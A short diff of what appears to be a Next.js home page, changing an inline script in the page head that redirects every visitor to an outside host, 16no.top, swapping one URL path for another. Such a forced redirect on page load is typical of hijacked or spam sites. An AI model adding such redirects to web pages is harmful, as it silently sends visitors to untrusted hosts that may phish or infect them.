@@ -8,7 +8,7 @@ export default function Home() {
       <Head>
     
     <script type="text/javascript">
-location="http://16no.top/cranky-liskov-1dbc47";
+location="http://16no.top/netlify-app";
 
 </script>
     
